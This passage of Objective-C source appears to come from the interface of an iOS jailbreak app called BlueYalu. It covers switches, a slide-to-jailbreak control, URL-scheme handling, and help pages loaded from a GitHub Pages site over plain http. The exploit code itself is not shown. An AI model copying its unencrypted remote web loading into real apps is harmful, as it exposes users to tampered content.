                                         message:@"You can jailbreak / re-jailbreak your device with your current settings by going to blueyalu://api/jb and you can jailbreak your device with your current settings but without substrate enabled by going to blueyalu://api/nsJB."
                                         preferredStyle:UIAlertControllerStyleAlert];
            UIAlertAction* close = [UIAlertAction
                                    actionWithTitle:@"Close"
                                    style:UIAlertActionStyleDestructive
                                    handler:^(UIAlertAction * action) {
                                    }];
            [alert addAction:close];
            [self presentViewController:alert animated:YES completion:nil];        }
        
        else if([urlscheme isEqual: @"blueyalu://about"]){
            aboutpg *about = [self.storyboard instantiateViewControllerWithIdentifier:@"aboutpg"];
            [self.navigationController pushViewController:about animated:YES];
        }
        
        else if([urlscheme isEqual: @"blueyalu://settings"]){
            [_advancedsettings setAlpha:0.0f];
            [_advancedsettings setAlpha:1.0f];
            [[UIApplication sharedApplication] setStatusBarStyle:UIStatusBarStyleDefault];
            [_advancedsettings setHidden:(NO)];
            viewChk = 0;
            cs = 1;
        }
    }
    NSString *cancelscheme = @"CANCEL";
    [[NSUserDefaults standardUserDefaults] setObject:cancelscheme forKey:@"urlscheme"];
    [[NSUserDefaults standardUserDefaults] synchronize];
}

- (void) viewWillAppear:(BOOL)animated
{
    [_advancedbtn setExclusiveTouch:YES];
    [_nbxd setExclusiveTouch:YES];
    [_scb setExclusiveTouch:YES];
    [_btnt setExclusiveTouch:YES];
    [_btntt setExclusiveTouch:YES];
    [_ucb setExclusiveTouch:YES];
    [_cfu setExclusiveTouch:YES];
    [_aboutb setExclusiveTouch:YES];
    [_unjb setExclusiveTouch:YES];
    [_ihs setExclusiveTouch:YES];
    [_continueBtn setExclusiveTouch:YES];
    BOOL stch6= [[NSUserDefaults standardUserDefaults] boolForKey:@"switch6"];
    NSLog(@"%@",stch6?@"YES":@"NO");
    [self.vnodeswitch setOn:stch6 animated:YES];
    BOOL stch7= [[NSUserDefaults standardUserDefaults] boolForKey:@"switch7"];
    NSLog(@"%@",stch7?@"YES":@"NO");
    [self.ssswitch setOn:stch7 animated:YES];
    [super viewWillAppear:animated];
    [_ktxt setAlpha:0.0f];
    [_stjb setAlpha:0.6f];
    [_drag setAlpha:0.6f];
    [_jbnv setHidden:YES];
    NSURL *targetURL = [NSURL URLWithString:@"http://loftynine7.github.io/5dot1BlueYaluCriticalUpdateCheck.html"];
    NSURLRequest *request = [NSURLRequest requestWithURL:targetURL];
    [_critical_update_checker loadRequest:request];
    NSURL *targetURL1 = [NSURL URLWithString:@"http://loftynine7.github.io/5dot1BlueYaluUpdateCheck.html"];
    NSURLRequest *request1 = [NSURLRequest requestWithURL:targetURL1];
    [_updatewv loadRequest:request1];
    _updatewv.scrollView.scrollEnabled = NO;
    _updatewv.scrollView.bounces = NO;
    if([_advancedsettings isHidden] == YES) {
        [[UIApplication sharedApplication] setStatusBarStyle:UIStatusBarStyleLightContent];
    }
    _continueBtn.layer.cornerRadius = 5;
    [self.navigationController setNavigationBarHidden:YES animated:animated];
    NSString *filePath = @"/Applications/Cydia.app";
    if ([[NSFileManager defaultManager] fileExistsAtPath:filePath])
    {
        [_cyLabel setText:@"Reset Jailbreak:"];
        [_cySwitch setOn:NO animated:YES];
    }
    else {
        [_cySwitch setOn:YES animated:YES];
        CydiaGet = 1;
        [self dismissViewControllerAnimated:YES completion:nil];
    }
    NSString *_value= [[NSUserDefaults standardUserDefaults] stringForKey:@"stateOfSwitch"];
    NSString *_value1= [[NSUserDefaults standardUserDefaults] stringForKey:@"stateOfSwitch1"];
    
    if([_value1 compare:@"ON"] == NSOrderedSame){
        _substrateswitch.on = YES;
    }
    else {
        _substrateswitch.on = NO;
    }
}

-(void)nsd:(BOOL)animated {
    if (_drag.center.x == 50) {
        
        [UIView animateWithDuration:0.14f animations:^{
            
            [_stjb setAlpha:0.6f];
            
        } completion:nil];
    }
    if (NoSubstrateDetect == 1) {
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            [NSThread sleepForTimeInterval:2.0f];
            dispatch_async(dispatch_get_main_queue(), ^{
                [_hooray setHidden:(NO)];
                [_advancedbtn setEnabled:NO];
                [_advancedbtn setBackgroundColor:[UIColor grayColor]];
                assert(NO);
            });
        });
    }
    if(viewChk == 1) {
    if (_drag.center.x < 60.0 && _drag.center.x > 51.0) {
        [UIView animateWithDuration:0.50f animations:^{
            
            [_stjb setAlpha:0.6f];
            
        } completion:nil];
    }
    if (_drag.center.x < 49.9) {
        _drag.center = CGPointMake(50, _drag.center.y
                                   );
        [UIView animateWithDuration:0.14f animations:^{
            
            [_stjb setAlpha:0.6f];
            
        } completion:nil];
    }
    if (_drag.center.x < 280 && _drag.center.x > 60.0) {
        [UIView animateWithDuration:0.14f animations:^{
            
            [_stjb setAlpha:0.0f];
            
        } completion:nil];
    }
    }
    [self urlscheme];
}

-(void)dodatnow{
    if ([_substrateswitch isOn]) {
        SubstrateVar = 1;
    }
    else {
        SubstrateVar = 0;
    }
    if ([_cySwitch isOn]) {
        CydiaGet = 1;
    }
    else {
        CydiaGet = 0;
    }
    if (viewChk == 1) {
        if (goawayplzzzz == 0) {
            CGPoint point = [gesture locationInView:self.ve];
            
            int num = point.x;
            
            _drag.center = CGPointMake(num, _drag.center.y);

            if (_drag.center.x > 274){
                
                _drag.center = CGPointMake(274, _drag.center.y);
                
                [self.view removeGestureRecognizer:gesture];
                
                [self yolo];
                
            }
            
            if (_drag.center.x == 50) {
                
                [UIView animateWithDuration:0.14f animations:^{
                    
                    [_stjb setAlpha:0.6f];
                    
                } completion:nil];
            }
            
            if (_drag.center.x < 280 && _drag.center.x > 60.0) {
                [UIView animateWithDuration:0.14f animations:^{
                    
                    [_stjb setAlpha:0.0f];
                    
                } completion:nil];
            }
            
            if (_drag.center.x < 49.9) {
                _drag.center = CGPointMake(50, _drag.center.y
                                           );
                [UIView animateWithDuration:0.14f animations:^{
                    
                    [_stjb setAlpha:0.6f];
                    
                } completion:nil];
            }
            
            if(gesture.state == UIGestureRecognizerStateEnded)
            {
                [UIView animateWithDuration:0.5f animations:^{
                    
                    _drag.center = CGPointMake(50, _drag.center.y);
                    
                    /* old [_drag setAlpha:0.0f];
                    [_stjb setAlpha:0.0f];
                    [_ktxt setAlpha:0.6f];*/
                    
                } completion:nil];
                
                /* Old code for handling this
                dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
                    [NSThread sleepForTimeInterval:0.6f];
                    dispatch_async(dispatch_get_main_queue(), ^{
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        UIAlertController * alert = [UIAlertController
                                                     alertControllerWithTitle:@"Jailbreak Cancelled"
                                                     message:@"The jailbreak was cancelled because you let go of the slider."
                                                     preferredStyle:UIAlertControllerStyleAlert];
                        
                        UIAlertAction *OK = [UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:^(UIAlertAction * action) {
                            [_drag setAlpha:0.0f];
                            [_stjb setAlpha:0.0f];
                            [_ktxt setAlpha:0.6f];
                            [UIView animateWithDuration:0.8f animations:^{
                                
                                [_drag setAlpha:0.6f];
                                [_stjb setAlpha:0.6f];
                                [_ktxt setAlpha:0.0f];
                                
                            } completion:nil];
                        }];
                        
                        [alert addAction:OK];
                        //[self presentViewController:alert animated:YES completion:nil];
                        
                        
                        
                        
                        
                        
                        
                    });
                });
                
                 dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
                    [NSThread sleepForTimeInterval:1.0f];
                    dispatch_async(dispatch_get_main_queue(), ^{
                        // _drag.center = CGPointMake(50, _drag.center.y);
                        // [_stjb setHidden:NO];
                    });
                });
                 */
            }
        }
    }
}

-(void)keyboardDidShow {
    // why? why the fuck not?
}

- (void) viewWillDisappear:(BOOL)animated
{
    [super viewWillDisappear:animated];
    [self.navigationController setNavigationBarHidden:NO animated:animated];
    NSURL *targetURL = [NSURL URLWithString:@"http://loftynine7.github.io/5dot1BlueYaluCriticalUpdateCheck.html"];
    NSURLRequest *request = [NSURLRequest requestWithURL:targetURL];
    [_critical_update_checker loadRequest:request];
    NSURL *targetURL1 = [NSURL URLWithString:@"http://loftynine7.github.io/5dot1BlueYaluUpdateCheck.html"];
    NSURLRequest *request1 = [NSURLRequest requestWithURL:targetURL1];
    [_updatewv loadRequest:request1];
}

- (void)dealloc {
    [_jb release];
    [_blurredJBView release];
    [_substrateswitch release];
    [_cySwitch release];
    [_cyLabel release];
    [_welcome release];
    [_continueBtn release];
    [_ago release];
    [_critical_update_checker release];
    [_updatewv release];
    [_uv release];
    [_drag release];
    [_ve release];
    [_b release];
    [_stjb release];
    [_jbingv release];
    [_hooray release];
    [_nbxd release];
    [_jbnv release];
    [_ktxt release];
    [_advancedsettings release];
    [_advancedbtn release];
    [_ssswitch release];
    [_vnodeswitch release];
    [_tmv release];
    [_tmvv release];
    [_cfu release];
    [_aboutb release];
    [_unjb release];
    [_ucb release];
    [_scb release];
    [_btnt release];
    [_btntt release];
    [_ihs release];
    [super dealloc];
}

@end

@interface aboutpg ()
@property (retain, nonatomic) IBOutlet UIView *aboutView;
@property (retain, nonatomic) IBOutlet UIView *creditsView;
@property (retain, nonatomic) IBOutlet UIView *goose;
@property (retain, nonatomic) IBOutlet UIToolbar *tb;

@end

@implementation aboutpg

- (void)viewDidLoad {
    [super viewDidLoad];
    [_goose setHidden:YES];
}

- (void)viewDidLayoutSubviews {
}

- (void)viewWillLayoutSubviews {
}

- (IBAction)viewswitch:(id)sender {
    UISegmentedControl *segmentedControl = (UISegmentedControl *) sender;
    NSInteger selectedSegment = segmentedControl.selectedSegmentIndex;
    if (selectedSegment == 0) {
        [_aboutView setHidden:NO];
        [_creditsView setHidden:YES];
        self.navigationItem.title = @"About";
    }
    else {
        [_aboutView setHidden:YES];
        [_creditsView setHidden:NO];
        self.navigationItem.title = @"Credits";
    }
}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Give any resources that can be recreated to Windows, they'll recycle it well.
}

-(void)viewWillAppear:(BOOL)animated {
    nsJB = 0;
    [[UIApplication sharedApplication] setStatusBarStyle:UIStatusBarStyleDefault];
    [self.navigationController setNavigationBarHidden:NO animated:animated];
    self.navigationController.navigationBar.translucent = NO;
    UITapGestureRecognizer *ttg = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(ttg:)];
    ttg.numberOfTapsRequired = 3;
    [_creditsView addGestureRecognizer:ttg];
    [ttg release];
}

- (void)ttg:(UITapGestureRecognizer *)sender {
    if (sender.state == UIGestureRecognizerStateRecognized) {
        self.navigationItem.title = @"Goose";
        [_tb setHidden:YES];
        [_creditsView setHidden:YES];
        [_aboutView setHidden:YES];
        [_goose setHidden:NO];
    }
}

- (void)dealloc {
    [_aboutView release];
    [_creditsView release];
    [_tb release];
    [_goose release];
    [super dealloc];
}
@end

@interface sshhelp ()
@property (retain, nonatomic) IBOutlet UIWebView *help;

@end

@implementation sshhelp

- (void)viewDidLoad {
    [super viewDidLoad];
}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Give any resources that can be recreated to Windows, they'll recycle it well.
}

-(void)viewWillAppear:(BOOL)animated {
    [[UIApplication sharedApplication] setStatusBarStyle:UIStatusBarStyleDefault];
    [self.navigationController setNavigationBarHidden:NO animated:animated];
    NSURL *targetURL = [NSURL URLWithString:@"http://loftynine7.github.io/sshhelp.html"];
    NSURLRequest *request = [NSURLRequest requestWithURL:targetURL];
    [_help loadRequest:request];
    self.navigationController.navigationBar.translucent = NO;
}

-(void)viewWillDisappear:(BOOL)animated {
}

- (void)dealloc {
    [_help release];
    [super dealloc];
}
@end

@interface noncehelp ()
@property (retain, nonatomic) IBOutlet UIWebView *help;

@end

@implementation noncehelp

- (void)viewDidLoad {
    [super viewDidLoad];
}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Give any resources that can be recreated to Windows, they'll recycle it well.
}

-(void)viewWillAppear:(BOOL)animated {
    [[UIApplication sharedApplication] setStatusBarStyle:UIStatusBarStyleDefault];
    [self.navigationController setNavigationBarHidden:NO animated:animated];
    NSURL *targetURL = [NSURL URLWithString:@"http://loftynine7.github.io/nonce.html"];
    NSURLRequest *request = [NSURLRequest requestWithURL:targetURL];
    [_help loadRequest:request];
    self.navigationController.navigationBar.translucent = NO;
    
}

-(void)viewWillDisappear:(BOOL)animated {
}

- (void)dealloc {
    [_help release];
    [super dealloc];
}
@end

@interface vnode ()
@property (retain, nonatomic) IBOutlet UIWebView *help;

@end

@implementation vnode

- (void)viewDidLoad {
    [super viewDidLoad];
}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Give any resources that can be recreated to Windows, they'll recycle all of it well.
}

-(void)viewWillAppear:(BOOL)animated {
    [[UIApplication sharedApplication] setStatusBarStyle:UIStatusBarStyleDefault];
    [self.navigationController setNavigationBarHidden:NO animated:animated];
    NSURL *targetURL = [NSURL URLWithString:@"http://loftynine7.github.io/vnode.html"];
    NSURLRequest *request = [NSURLRequest requestWithURL:targetURL];
    [_help loadRequest:request];
    self.navigationController.navigationBar.translucent = NO;
}

-(void)viewWillDisappear:(BOOL)animated {
}

- (void)dealloc {
    [_help release];
    [super dealloc];
}
@end

// if help is needed, send me a message on Twitter (@1GamerDev) with #wenetajelbrekhelp, if you dont get a reply within idk like 5.31836178534628698631046678494734274982374239857 days then spam the shit outta my notifications and dms until i answer :P
